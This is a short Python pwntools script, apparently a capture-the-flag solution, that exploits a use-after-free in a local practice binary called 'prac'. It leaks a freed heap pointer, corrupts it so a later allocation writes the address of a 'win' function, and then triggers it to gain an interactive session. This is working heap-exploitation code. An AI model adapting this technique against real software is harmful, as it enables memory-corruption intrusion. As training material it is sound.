from pwn import *

global p
p = process("./prac")
 
def menu():
    p.recvuntil("Choice: ")

def make(index,name):
    log.info("Make: {}".format(index))
    p.sendline("a")
    p.recvuntil("Clone ID:",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def edit(index,name):
    log.info("Edit: {}".format(index))
    p.sendline("c")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("b")
    p.recvuntil("Clone ID:")
    p.sendline(str(index))
    menu()

def view(index):
    log.info("View: {}".format(index))
    p.sendline("d")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Name: ",timeout=0.1)
    result = p.recvline()
    menu()
    return result

def hint(index):
    log.info("Hint: {}".format(index))
    p.sendline("h")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.interactive()
    return p.recvline()

make(1, "1111")
make(2, "2222")
make(3, "3333")
kill(2)
kill(3)
leak = u32(view(3)[:4])
edit(3, p32(leak-0x10+0x8))
make(4, "4444")
make(5, p32(p.elf.symbols['win']))
hint(1)


